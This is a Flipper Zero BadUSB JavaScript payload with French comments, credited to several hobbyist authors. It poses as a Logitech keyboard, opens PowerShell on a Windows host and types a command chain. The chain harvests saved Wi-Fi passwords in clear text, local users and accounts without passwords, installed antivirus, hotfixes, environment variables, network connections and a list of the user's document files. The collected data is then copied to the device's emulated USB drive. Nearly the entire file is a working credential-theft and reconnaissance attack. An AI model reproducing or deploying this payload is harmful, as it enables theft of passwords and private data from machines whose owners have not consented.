// Original: [JS Script: BadUSB_Win_Exfil-GSHD.js (By Gas Station Hot Dog)](https://github.com/User84User/User84PublicUser/blob/main/Windows_Exfil-GSHD.js)
// Updated BadUSB Win Exfil JS Script (By Gas Station Hot Dog & b0r0xZ & mistura.) (Comments added along with more commands)
// Small modification and french traduction. (By Miiraak)

// Stockage Mass_USB :
let stockage = "/ext/apps_data/mass_storage/Exfiltration.img";
// Capacité total du stockage :
let capacite = 16 * 2048 * 2048;

// Requis :
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Choix du layout :
let layout = "fr-CH";

// Ensemble des commandes qui doivent être lancée :
let script = [
	"$Date = Get-Date -Format yyyy-MM-dd;",// Obtient la date du jour
	"$Time = Get-Date -Format hh-mm-ss;",// Obtiens l'heure actuelle 
	"Get-CimInstance -ClassName Win32_ComputerSystem >> config.txt;", // Liste des fabricant et model du PC
	"Get-LocalUser >> config.txt;", //Liste des utilisateurs
	"Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> config.txt;", //Liste des utilisateurs ne requérant pas de mot de passe
	"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> config.txt;", // Liste des antivirus installés 
	"Get-CimInstance -ClassName Win32_QuickFixEngineering >> config.txt;", // Liste des hotfixes
	"(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> config.txt;",// Profils réseaux et mot de passe
	"dir env: >> config.txt;", // Vérification de l'environnement
	"Get-Computerinfo >> config.txt;", // Informations sur l'ordinateur
	"Get-Service >> config.txt;", // Récupère les services en cours 
	"Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> config.txt;", // Check tout les IPv4 autre que LocalHost
	"Get-NetTCPConnection | Where-Object -Property State -Match Listen >> config.txt;", // Liste tout les ports en mode "Ecoute"	
	"Get-NetTCPConnection | Select-Object -Property * >> config.txt;", // Récupère les informations TCP, les ports, états, etc...
	"Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse >> config.txt", // Affiche des informations sur les fichiers correspondants aux critères 
];

// Script Crawler
let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

print("Temps : ~2min")
print("Recherche de l'emplacement de stockage...")
// Vérifie si l'emplacement du stockage existe.
if (storage.exists(capacite)) {
    print ("Le stockage existe...");
}
// Sinon le créer !
else {
	print ("Creation de l'emplacement de stockage...");
	usbdisk.createImage(capacite, size);
}

print("Generation du payload...")
// Création du layout utilisé par BadUSB :
badusb.setup({ vid: 0x046D, pid: 0xc33f, mfr_name: "Logitec, Inc",
prod_name: "Keyboard", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });

print("Recherche d'hote...");
// Attend d'être connecté à un hôte :
while (!badusb.isConnected()) {
    delay(1000);
}

print("Injection du payload");
// Ouvre le menu des outils :
badusb.press("GUI", "x");
delay(300);
// Choisi Powershell :
badusb.press("i");
delay(3000);
// Lance le crawler :
badusb.println(command, 10);
badusb.press("ENTER");
// Détermine selon TIME / DATE et le USERNAME les nom des dossier/fichier. Puis déplace le fichier config.txt crée dans le dossier "User" au stockage Mass_USB du flipper Zero :
badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path config.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; exit")//Find Disk Partition to save
badusb.press("ENTER");
badusb.quit();

delay(2000);
usbdisk.start(stockage);

print("Attendez la fermeture du Terminal...");

while (!usbdisk.wasEjected()) {
    delay(1000);
}
print("Done");
usbdisk.stop();

